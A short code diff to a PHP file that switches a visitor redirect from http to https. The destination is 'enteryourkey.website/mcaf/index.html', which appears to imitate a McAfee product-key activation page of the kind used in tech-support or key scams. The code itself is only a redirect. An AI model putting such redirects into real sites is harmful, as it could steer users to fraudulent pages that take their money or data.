@@ -1,4 +1,4 @@
 <?php
-header("Location: http://enteryourkey.website/mcaf/index.html");
+header("Location: https://enteryourkey.website/mcaf/index.html");
 die();
 ?>
